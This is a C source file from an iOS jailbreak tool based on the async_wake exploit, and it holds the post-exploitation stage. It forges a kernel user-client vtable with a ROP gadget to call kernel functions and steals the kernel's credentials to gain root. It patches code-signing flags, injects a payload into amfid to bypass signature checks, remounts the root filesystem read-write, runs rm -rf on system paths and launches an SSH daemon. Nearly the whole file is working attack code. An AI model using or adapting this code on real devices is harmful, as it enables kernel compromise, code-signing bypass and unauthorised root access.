//
//  fun.c
//  async_wake_ios
//
//  Created by George on 14/12/17.
//  Copyright © 2017 Ian Beer. All rights reserved.
//

#include "fun.h"
#include "kmem.h"
#include "IOKit.h"
#include "kutils.h"
#include "utils.h"
#include "file_utils.h"
#include "amfi_utils.h"
#include "codesign.h"
#include "offsetof.h"
#include "unlocknvram.h"
#include "remap_tfp_set_hsp.h"
#include <dlfcn.h>
#include <CommonCrypto/CommonDigest.h>
#include "xpc_minimal.h"

#define BOOTSTRAP_PREFIX "bootstrap"

// MARK: - Functions

char *itoa(long n) {
    int len = n==0 ? 1 : floor(log10l(labs(n)))+1;
    if (n<0) len++; // room for negative sign '-'
    
    char    *buf = calloc(sizeof(char), len+1); // +1 for null
    snprintf(buf, len+1, "%ld", n);
    return   buf;
}

mach_port_t tfpzero;

#define OSDictionary_ItemCount(dict) rk32(dict+20)
#define OSDictionary_ItemBuffer(dict) rk64(dict+32)
#define OSDictionary_ItemKey(buffer, idx) rk64(buffer+16*idx)
#define OSDictionary_ItemValue(buffer, idx) rk64(buffer+16*idx+8)
uint32_t SetObjectWithCharP = 8*31;
#define OSDictionary_SetItem(dict, str, val) {\
uint64_t s = kalloc(strlen(str)+1); kwrite(s, str, strlen(str)); \
kexecute(rk64(rk(dict)+SetObjectWithCharP), dict, s, val, 0, 0, 0, 0); \
}
#define OSString_CStringPtr(str) rk64(str+0x10)

// MARK: - Post exploit patching

int begin_fun(mach_port_t tfp0, mach_port_t user_client, bool enable_tweaks) {
	
	kern_return_t err;
	
	tfpzero = tfp0;
	
	// Loads the kernel into the patch finder, which just fetches the kernel memory for patchfinder use
	init_kernel(find_kernel_base(), NULL);
	
	// Get the slide
    uint64_t kernel_base = find_kernel_base();
	uint64_t slide = kernel_base - 0xFFFFFFF007004000;
	printf("slide: 0x%016llx\n", slide);
	
	// From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
	uint64_t IOSurfaceRootUserClient_port = find_port_address(user_client, MACH_MSG_TYPE_MAKE_SEND); // UserClients are just mach_ports, so we find its address
	uint64_t IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
	uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
	
	// The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
	// Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
	
	// Create the vtable in the kernel memory, then copy the existing vtable into there
	uint64_t fake_vtable = kalloc(0x1000);
	printf("Created fake_vtable at %016llx\n", fake_vtable);
	
	for (int i = 0; i < 0x200; i++) {
		wk64(fake_vtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
	}
	
	printf("Copied some of the vtable over\n");
	
	// Create the fake user client
	uint64_t fake_client = kalloc(0x1000);
	printf("Created fake_client at %016llx\n", fake_client);
	
	for (int i = 0; i < 0x200; i++) {
		wk64(fake_client+i*8, rk64(IOSurfaceRootUserClient_addr+i*8));
	}
	
	printf("Copied the user client over\n");
	
	// Write our fake vtable into the fake user client
	wk64(fake_client, fake_vtable);
	
	// Replace the user client with ours
	wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
	
	// Now the userclient port we have will look into our fake user client rather than the old one
	
	// Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
	wk64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
	
	printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
	
	// When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
	// to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
	// This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
	// function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
	// through like normal.
	
	// Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
	// We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
	// (i'm not actually sure if the switch back is necessary but meh
#define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
do { \
	uint64_t offx20 = rk64(fake_client+0x40); \
	uint64_t offx28 = rk64(fake_client+0x48); \
	wk64(fake_client+0x40, x0); \
	wk64(fake_client+0x48, addr); \
	err = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6)); \
	wk64(fake_client+0x40, offx20); \
	wk64(fake_client+0x48, offx28); \
} while (0);
	
	// Get our and the kernels struct proc from allproc
	uint32_t our_pid = getpid();
	uint64_t our_proc = 0;
	uint64_t kern_proc = 0;
	uint64_t amfid_proc = 0;
    uint32_t amfid_pid = 0;
    uint32_t cfprefsd_pid = 0;
    uint32_t backboardd_pid = 0;
    
    bool found_jailbreakd = false;
	
	uint64_t proc = rk64(find_allproc());
	while (proc) {
		uint32_t pid = (uint32_t)rk32(proc + offsetof_p_pid);
		char name[40] = {0};
		kread(proc+0x268, name, 20);
		if (pid == our_pid) {
			our_proc = proc;
		} else if (pid == 0) {
			kern_proc = proc;
        } else if (pid == 1){
            printf("found launchd\n");
            
            uint32_t csflags = rk32(proc + offsetof_p_csflags);
            wk32(proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
		} else if (strstr(name, "amfid")) {
			printf("found amfid - getting task\n");
            amfid_proc = proc;
            amfid_pid = pid;
            
            uint32_t csflags = rk32(proc + offsetof_p_csflags);
            wk32(proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
        } else if (strstr(name, "cfprefsd")){
            printf("found cfprefsd. keeping PID\n");
            cfprefsd_pid = pid;
        } else if (strstr(name, "backboardd")){
            printf("found backboardd. keeping PID\n");
            backboardd_pid = pid;
        } else if (strstr(name, "jailbreakd")){
            printf("found jailbreakd. already jailbroken!\n");
            found_jailbreakd = true;
        }
		proc = rk64(proc);
	}
    
    if (found_jailbreakd){
        wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
        return -1;
    }
	
	printf("our proc is at 0x%016llx\n", our_proc);
	printf("kern proc is at 0x%016llx\n", kern_proc);
	
	// Properly copy the kernel's credentials so setuid(0) doesn't crash
	uint64_t kern_ucred = 0;
	KCALL(find_copyout(), kern_proc+0x100, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    
	uint64_t self_ucred = 0;
	KCALL(find_copyout(), our_proc+0x100, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);

	KCALL(find_bcopy(), kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
	KCALL(find_bzero(), self_ucred + 0x18, 12, 0, 0, 0, 0, 0);
	
	setuid(0);
	
	printf("our uid is %d\n", getuid());
	
    // Test writing to file
    {
        FILE *f = fopen("/var/mobile/test.txt", "w");
        if (f == 0) {
            printf("failed to write test file");
        } else {
            printf("wrote test file: %p\n", f);
        }
        
        unlink("/var/mobile/test.txt");
    }

    // Remap tfp0
    {
        mach_port_t real_tfp0 = MACH_PORT_NULL;
        if (remap_tfp0_set_hsp4(&real_tfp0)) {
            real_tfp0 = MACH_PORT_NULL;
        }
        printf("remapped tfp0: 0x%x\n", real_tfp0);
    }

	// Remount / as rw - patch by xerub with nosuid patch added by coolstar
	{
		uint64_t _rootvnode = find_rootvnode();
		uint64_t rootfs_vnode = rk64(_rootvnode);
		uint64_t v_mount = rk64(rootfs_vnode + offsetof_v_mount);
		uint32_t v_flag = rk32(v_mount + offsetof_mnt_flag);
		
        v_flag = v_flag & ~MNT_NOSUID;
        v_flag = v_flag & ~MNT_RDONLY;
        
		wk32(v_mount + offsetof_mnt_flag, v_flag & ~MNT_ROOTFS);
		
		char *nmz = strdup("/dev/disk0s1s1");
                int rv = mount("apfs", "/", MNT_UPDATE, (void *)&nmz);
		printf("remounting: %d\n", rv);
		
		v_mount = rk64(rootfs_vnode + offsetof_v_mount);
		wk32(v_mount + offsetof_mnt_flag, v_flag);
		
		int fd = open("/.bit_of_fun", O_RDONLY);
		if (fd == -1) {
			fd = creat("/.bit_of_fun", 0644);
		} else {
			printf("File already exists!\n");
		}
		close(fd);
	}
	
    printf("Did we mount / as read+write? %s\n", file_exists("/.bit_of_fun") ? "yes" : "no");
    
    unlink("/.bit_of_fun");
    
    FILE *fp = popen("/sbin/mount", "r");
    
    char *ln = NULL;
    size_t len = 0;
    
    while (getline(&ln, &len, fp) != -1)
        fputs(ln, stdout);
    fclose(fp);
    
    pid_t pd;
    int rv = 0;
    
    const char *tar = "/" BOOTSTRAP_PREFIX "/tar";
    
    // Prepare our binaries
    {
        if (!file_exists("/bootstrap")) {
            printf("making /bootstrap\n");
            mkdir("/bootstrap", 0755);
        }
        
        mkdir("/" BOOTSTRAP_PREFIX, 0755);
        extractTarBinary();
        chmod(tar, 0755);
        inject_trusts(1, (const char **)&(const char*[]){tar});

        // old
        unlink("/bootstrap/inject_amfid");
        unlink("/bootstrap/inject_launchd");
        unlink("/bootstrap/launchd_payload.dylib");
        unlink("/bootstrap/xpcproxy_payload.dylib");

        unlink("/bootstrap/inject_ctriticald");
        unlink("/bootstrap/pspawn_payload.dylib");

        unlink("/bootstrap/amfid_payload.dylib");
        unlink("/bootstrap/launchjailbreak");
        unlink("/bootstrap/jailbreakd");
        
        rv = posix_spawn(&pd, tar, NULL, NULL, (char **)&(const char*[]){ tar, "-xpf", progname("basebinaries.tar"), "-C", "/" BOOTSTRAP_PREFIX, NULL }, NULL);
        waitpid(pd, NULL, 0);
        
        printf("[fun] copied the required binaries into the right places\n");
    }
    
    inject_trusts(3, (const char **)&(const char*[]){
        "/bootstrap/inject_criticald",
        "/bootstrap/amfid_payload.dylib",
        "/bootstrap/pspawn_payload.dylib",

        // Don't forget to update number in beginning
    });
    
#define BinaryLocation "/bootstrap/inject_criticald"
    
    const char* args_amfid[] = {BinaryLocation, itoa(amfid_pid), "/bootstrap/amfid_payload.dylib", NULL};
    rv = posix_spawn(&pd, BinaryLocation, NULL, NULL, (char **)&args_amfid, NULL);
    waitpid(pd, NULL, 0);
    
    //unlocknvram();
    
    rv = posix_spawn(&pd, tar, NULL, NULL, (char **)&(const char*[]){ tar, "-xpf", progname("gnubinpack.tar"), "-C", "/" BOOTSTRAP_PREFIX, NULL }, NULL);
    waitpid(pd, NULL, 0);

    inject_trusts(1, (const char **)&(const char*[]){"/"BOOTSTRAP_PREFIX"/bin/launchctl"});

    // TODO: Clean this up, like, a lot
    mkdir("/bootstrap/Library", 0755);
    mkdir("/bootstrap/Library/LaunchDaemons", 0755);
    unlink("/bootstrap/Library/LaunchDaemons/dropbear.plist");
    cp("/bootstrap/Library/LaunchDaemons/dropbear.plist", progname("dropbear.plist"));
    chmod("/bootstrap/Library/LaunchDaemons/dropbear.plist", 0600);
    chown("/bootstrap/Library/LaunchDaemons/dropbear.plist", 0, 0);
    
    if (file_exists("/bootstrap/._amfid_payload.dylib")){
        rv = posix_spawn(&pd, "/bootstrap/usr/bin/find", NULL, NULL, (char **)&(const char*[]){ "find", "/bootstrap", "-name", "._*", "-delete", NULL }, NULL);
        waitpid(pd, NULL, 0);
    }
    if (file_exists("/Applications/Anemone.app/._Info.plist")){
        rv = posix_spawn(&pd, "/bootstrap/usr/bin/find", NULL, NULL, (char **)&(const char*[]){ "find", "/Applications/Anemone.app", "-name", "._*", "-delete", NULL }, NULL);
        waitpid(pd, NULL, 0);
    }
    if (file_exists("/Applications/SafeMode.app/._Info.plist")){
        rv = posix_spawn(&pd, "/bootstrap/usr/bin/find", NULL, NULL, (char **)&(const char*[]){ "find", "/Applications/SafeMode.app", "-name", "._*", "-delete", NULL }, NULL);
        waitpid(pd, NULL, 0);
    }
    if (file_exists("/usr/lib/SBInject/._AnemoneCore.dylib")){
        rv = posix_spawn(&pd, "/bootstrap/usr/bin/find", NULL, NULL, (char **)&(const char*[]){ "find", "/usr/lib/SBInject", "-name", "._*", "-delete", NULL }, NULL);
        waitpid(pd, NULL, 0);
    }
    
    bool runUICache = true;
    if (file_exists("/Applications/Anemone.app"))
        runUICache = false;
    
    if (enable_tweaks) {
        // Cleanup old symlinks
        if (file_exists("/System/Library/Themes")) {
            printf("removing /System/Library/Themes\n");
            
            rv = posix_spawn(&pd, "/"BOOTSTRAP_PREFIX"/bin/rm", NULL, NULL, (char **)&(const char*[]){ "rm", "-rf", "/System/Library/Themes", NULL }, NULL);
            waitpid(pd, NULL, 0);
            unlink("/"BOOTSTRAP_PREFIX"/Library/Themes");
            
            if (file_exists("/usr/lib/SBInject")) {
                printf("removing /usr/lib/SBInject\n");
                
                rv = posix_spawn(&pd, "/bootstrap/bin/rm", NULL, NULL, (char **)&(const char*[]){ "rm", "-rf", "/usr/lib/SBInject", NULL }, NULL);
                unlink("/"BOOTSTRAP_PREFIX"/Library/SBInject");
            }
        }
        
        
        rv = posix_spawn(&pd, tar, NULL, NULL, (char **)&(const char*[]){ tar, "-xpf", progname("tweaksupport.tar"), "-C", "/" BOOTSTRAP_PREFIX, NULL }, NULL);
        waitpid(pd, NULL, 0);
        
        rv = posix_spawn(&pd, tar, NULL, NULL, (char **)&(const char*[]){ tar, "-xpf", progname("anemoneapp.tar"), "-C", "/Applications", NULL }, NULL);
        waitpid(pd, NULL, 0);
        
        rv = posix_spawn(&pd, tar, NULL, NULL, (char **)&(const char*[]){ tar, "-xpf", progname("safemode.tar"), "-C", "/Applications", NULL }, NULL);
        waitpid(pd, NULL, 0);
    }
    unlink(tar);

    if (enable_tweaks && runUICache){
        const char *uicache = "/"BOOTSTRAP_PREFIX"/usr/bin/uicache";
        rv = posix_spawn(&pd, uicache, NULL, NULL, (char **)&(const char*[]){ uicache, NULL }, NULL);
        waitpid(pd, NULL, 0);
    }
    
    unlink("/usr/libexec/sftp-server");
    symlink("/"BOOTSTRAP_PREFIX"/usr/libexec/sftp-server","/usr/libexec/sftp-server");
    
    unlink("/usr/share/terminfo");
    symlink("/"BOOTSTRAP_PREFIX"/usr/share/terminfo","/usr/share/terminfo");
    
    if (enable_tweaks){
        unlink("/usr/lib/SBInject.dylib");
        cp("/usr/lib/SBInject.dylib","/bootstrap/usr/lib/SBInject.dylib");
        
        unlink("/usr/lib/libsubstitute.dylib");
        cp("/usr/lib/libsubstitute.dylib","/bootstrap/usr/lib/libsubstitute.dylib");
        
        unlink("/usr/lib/libsubstitute.0.dylib");
        cp("/usr/lib/libsubstitute.0.dylib","/bootstrap/usr/lib/libsubstitute.0.dylib");
        
        unlink("/usr/lib/libsubstrate.dylib");
        cp("/usr/lib/libsubstrate.dylib","/bootstrap/usr/lib/libsubstrate.dylib");
        
        rv = posix_spawn(&pd, "/"BOOTSTRAP_PREFIX"/bin/rm", NULL, NULL, (char **)&(const char*[]){ "rm", "-rf", "/Library/Frameworks/CydiaSubstrate.framework", NULL }, NULL);
        waitpid(pd, NULL, 0);
        
        mkdir("/Library/Frameworks/CydiaSubstrate.framework", 0755);
        symlink("/usr/lib/libsubstrate.dylib", "/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate");
        
        unlink("/usr/bin/recache");
        cp("/usr/bin/recache","/"BOOTSTRAP_PREFIX"/usr/bin/recache");
        chmod("/usr/bin/recache", 0755);
        
        unlink("/usr/bin/killall");
        cp("/usr/bin/killall","/"BOOTSTRAP_PREFIX"/usr/bin/killall");
        chmod("/usr/bin/killall", 0755);
        
        if (!file_exists("/usr/lib/SBInject")) {
            rename("/"BOOTSTRAP_PREFIX"/Library/SBInject", "/usr/lib/SBInject");
            symlink("/usr/lib/SBInject","/"BOOTSTRAP_PREFIX"/Library/SBInject");
        } else {
            rv = posix_spawn(&pd, "/bootstrap/bin/rm", NULL, NULL, (char **)&(const char*[]){ "rm", "-rf", "/"BOOTSTRAP_PREFIX"/Library/SBInject", NULL }, NULL);
            waitpid(pd, NULL, 0);
            symlink("/usr/lib/SBInject","/"BOOTSTRAP_PREFIX"/Library/SBInject");
        }
        
        unlink("/Library/Themes");
        symlink("/"BOOTSTRAP_PREFIX"/Library/Themes", "/Library/Themes");
    }
    
    unlink("/usr/lib/libjailbreak.dylib");
    cp("/usr/lib/libjailbreak.dylib","/bootstrap/libjailbreak.dylib");
    
    unlink("/bootstrap/unjailbreak.sh");
    cp("/bootstrap/unjailbreak.sh",progname("unjailbreak.sh"));
	
    rv = posix_spawn(&pd, "/bootstrap/bin/launchctl", NULL, NULL, (char **)&(const char*[]){ "launchctl", "load", "/"BOOTSTRAP_PREFIX"/Library/LaunchDaemons/dropbear.plist", NULL }, NULL);
    waitpid(pd, NULL, 0);

    // MARK: - Cleanup
    
    wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
    
    printf("Starting server...\n");
    start_jailbreakd(kernel_base);

    while (!file_exists("/var/tmp/jailbreakd.pid")){
        printf("Waiting for jailbreakd...\n");
        usleep(100000); //100 ms
    }

    update_springboard_plist();
    
    kill(cfprefsd_pid, SIGKILL);
    
    if (enable_tweaks){
        const char* args_launchd[] = {BinaryLocation, itoa(1), "/bootstrap/pspawn_payload.dylib", NULL};
        rv = posix_spawn(&pd, BinaryLocation, NULL, NULL, (char **)&args_launchd, NULL);
        waitpid(pd, NULL, 0);
        
        const char* args_recache[] = {"/bootstrap/usr/bin/recache", "--no-respring", NULL};
        rv = posix_spawn(&pd, "/bootstrap/usr/bin/recache", NULL, NULL, (char **)&args_recache, NULL);
        waitpid(pd, NULL, 0);
    }
    
    wk64(rk64(kern_ucred+0x78)+0x8, 0);
    
    if (enable_tweaks){
        kill(backboardd_pid, SIGTERM);
    }
    return 0;
}
